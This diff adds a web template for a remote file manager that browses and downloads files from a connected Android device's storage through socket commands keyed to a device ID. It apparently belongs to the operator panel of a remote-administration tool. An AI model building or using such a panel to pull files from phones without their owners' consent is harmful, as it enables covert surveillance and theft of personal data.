@@ -1,0 +1,268 @@
+<div class="ui segment">
+    <div class="ui secondary menu">
+        <div class="left menu">
+            <button onclick="location.reload()" class="ui icon button" title="Refresh to see new files">
+                <i class="refresh icon"></i>
+            </button>
+        </div>
+        <div class="right menu">
+            <button onclick="openDirectory(this, '/storage/emulated/0')" class="ui blue button dlop"> <i
+                    class="icon home"></i>Home</button>
+        </div>
+    </div>
+    
+    <% if (pageMeta && pageMeta.total) { %>
+    <div class="ui info message">
+        <i class="<%= pageMeta.hasMore ? 'circle notched loading' : 'check circle' %> icon"></i>
+        <strong><%= pageData.length %></strong> of <strong><%= pageMeta.total %></strong> files loaded
+        
+        <% 
+        let percent = Math.round((pageData.length / pageMeta.total) * 100);
+        let barWidth = percent + '%';
+        let remaining = pageMeta.total - pageData.length;
+        %>
+        
+        <div class="ui small progress" style="margin: 10px 0 5px 0;">
+            <div class="bar" style="width: <%= barWidth %>; background: <%= pageMeta.hasMore ? '#2185d0' : '#21ba45' %>;">
+                <div class="progress"><%= percent %>%</div>
+            </div>
+        </div>
+        
+        <% if (pageMeta.hasMore) { %>
+        <button class="ui blue button" onclick="loadMoreFiles()" id="loadMoreBtn">
+            <i class="download icon"></i> Load Next 500 Files (<%= remaining %> remaining)
+        </button>
+        <button class="ui green button" onclick="loadAllFiles()">
+            <i class="sync icon"></i> Load All
+        </button>
+        <button class="ui icon button" onclick="location.reload()" title="Refresh page">
+            <i class="refresh icon"></i>
+        </button>
+        <% } else { %>
+        <span class="ui green label">✓ Complete - All files loaded!</span>
+        <% } %>
+    </div>
+    <% } %>
+    
+    <table class="ui celled table">
+        <thead>
+            <tr>
+                <th style="text-align: center" colspan="2">Files (<%= pageData.length %>)</th>
+            </tr>
+        </thead>
+        <tbody>
+            <% pageData.forEach((item) => { %>
+            <tr>
+                <td title="<%= item.path %>"><%= item.name %></td>
+                <td class="collapsing">
+                    <% if(!item.isDir && !item.isDirectory) { %>
+                    <button class="ui button dlop" onclick="downloadFile(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
+                            class="icon download blue"></i></button>
+                    <% } else { %>
+                    <button class="ui button dlop"
+                        onclick="openDirectory(this, '<%= item.path %>')">&nbsp;&nbsp;&nbsp;<i
+                            class="icon folder open grey"></i></button>
+                    <% } %>
+                </td>
+            </tr>
+            <% }) %>
+        </tbody>
+    </table>
+
+    <script>
+        // Current folder info for loading more files
+        <% if (pageMeta) { %>
+        window.currentPath = '<%= pageMeta.path || "/" %>';
+        window.currentLoaded = <%= pageData.length %>;
+        window.totalFiles = <%= pageMeta.total || pageData.length %>;
+        window.hasMore = <%= pageMeta.hasMore ? 'true' : 'false' %>;
+        <% } else { %>
+        window.currentPath = '/';
+        window.currentLoaded = 0;
+        window.totalFiles = 0;
+        window.hasMore = false;
+        <% } %>
+        
+        console.log('📂 Current path:', window.currentPath);
+        console.log('📊 Loaded:', window.currentLoaded, '/', window.totalFiles);
+        console.log('➡️ Has more:', window.hasMore);
+        
+        // Listen for batch updates and auto-refresh
+        $(document).ready(function() {
+            console.log('🔧 Setting up socket listener...');
+            console.log('   Socket available:', typeof socket !== 'undefined');
+            console.log('   Device ID: <%= deviceID %>');
+            console.log('   Current path: ' + window.currentPath);
+            
+            // Wait for socket to be ready
+            let checkSocket = setInterval(function() {
+                if (typeof socket !== 'undefined' && socket) {
+                    clearInterval(checkSocket);
+                    
+                    console.log('✅ Socket ready! Setting up listener...');
+                    console.log('📡 Listening for file_batch_received events...');
+                    
+                    socket.on('file_batch_received', function(data) {
+                        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+                        console.log('📦 BATCH RECEIVED EVENT!');
+                        console.log('   Data:', JSON.stringify(data));
+                        console.log('   Expected clientID: <%= deviceID %>');
+                        console.log('   Expected path: ' + window.currentPath);
+                        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+                        
+                        // Check if this update is for the current device and path
+                        if (data.clientID === '<%= deviceID %>' && data.path === window.currentPath) {
+                            console.log('✅✅✅ MATCH! Auto-refreshing in 1 second...');
+                            console.log('   Batch #' + data.batchNumber + ': ' + data.loaded + '/' + data.total + ' files');
+                            
+                            // Show notification
+                            showNotification('#2ecc71', 'Batch ' + data.batchNumber + ' loaded: ' + data.loaded + '/' + data.total + ' files');
+                            
+                            // Auto-refresh page after short delay
+                            setTimeout(function() {
+                                console.log('🔄 REFRESHING NOW!');
+                                location.reload();
+                            }, 1000);
+                        } else {
+                            console.log('⏭️ NO MATCH - Ignoring');
+                            console.log('   Reason: clientID=' + (data.clientID === '<%= deviceID %>') + ', path=' + (data.path === window.currentPath));
+                        }
+                    });
+                    
+                    console.log('✅ Listener registered successfully!');
+                } else {
+                    console.log('⏳ Waiting for socket... (check #' + Math.floor(Date.now() / 100) + ')');
+                }
+            }, 100);
+        });
+        
+        // Load next 500 files
+        function loadMoreFiles() {
+            if (!window.hasMore) {
+                showNotification('#f39c12', 'All files already loaded!');
+                return;
+            }
+            
+            let btn = document.getElementById('loadMoreBtn');
+            if (btn) {
+                btn.classList.add('loading');
+                btn.disabled = true;
+            }
+            
+            console.log('📥 Loading next batch from offset:', window.currentLoaded);
+            
+            sendCommand('0xFI', {
+                action: 'ls',
+                path: window.currentPath,
+                offset: window.currentLoaded,
+                limit: 500
+            }, function(error, message) {
+                if (error) {
+                    showNotification('#f03434', 'Error: ' + error);
+                    if (btn) {
+                        btn.classList.remove('loading');
+                        btn.disabled = false;
+                    }
+                } else {
+                    showNotification('#2ecc71', 'Loading next 500 files...');
+                    // Refresh page after delay to see new files
+                    setTimeout(function() {
+                        location.reload();
+                    }, 2000);
+                }
+            });
+        }
+        
+        // Load all remaining files
+        function loadAllFiles() {
+            if (!window.hasMore) {
+                showNotification('#f39c12', 'All files already loaded!');
+                return;
+            }
+            
+            let remaining = window.totalFiles - window.currentLoaded;
+            console.log('📥 Loading all remaining', remaining, 'files...');
+            showNotification('#2ecc71', 'Loading all ' + remaining + ' remaining files...');
+            
+            // Request all remaining files at once
+            sendCommand('0xFI', {
+                action: 'ls',
+                path: window.currentPath,
+                offset: window.currentLoaded,
+                limit: remaining + 100 // Extra buffer
+            }, function(error, message) {
+                if (error) {
+                    showNotification('#f03434', 'Error: ' + error);
+                } else {
+                    // Refresh page after delay
+                    setTimeout(function() {
+                        location.reload();
+                    }, 3000);
+                }
+            });
+        }
+
+        function openDirectory(element, path) {
+            $(element).children().css("opacity", "0");
+            $(element).addClass('blue');
+            $(element).addClass('loading');
+            $('.dlop').addClass('disabled');
+            
+            sendCommand('0xFI', {
+                action: 'ls',
+                path: path,
+                offset: 0,
+                limit: 500
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error);
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('blue');
+                        $(element).removeClass('loading');
+                        $('.dlop').removeClass('disabled');
+                    }, 300);
+                } else {
+                    if (message === 'Requested') {
+                        showNotification('#2ecc71', 'Loading files...');
+                        // Refresh page after short delay to see first batch
+                        setTimeout(function() {
+                            location.reload();
+                        }, 1500);
+                    }
+                }
+            });
+        }
+
+        function downloadFile(element, path) {
+            $(element).children().css("opacity", "0");
+            $(element).addClass('green');
+            $(element).addClass('loading');
+            $('.dlop').addClass('disabled');
+            
+            sendCommand('0xFI', {
+                action: 'dl',
+                path: path
+            }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error);
+                        $(element).children().css("opacity", "1");
+                        $(element).removeClass('green');
+                        $('.dlop').removeClass('disabled');
+                    }, 300);
+                } else {
+                    if (message === 'Requested') {
+                        showNotification('#3498db', 'Downloading file... Please wait');
+                        setTimeout(() => {
+                            $(element).children().css("opacity", "1");
+                            $(element).removeClass('green');
+                            $(element).removeClass('loading');
+                            $('.dlop').removeClass('disabled');
+                        }, 2000);
+                    }
+                }
+            });
+        }
+    </script>
+</div>
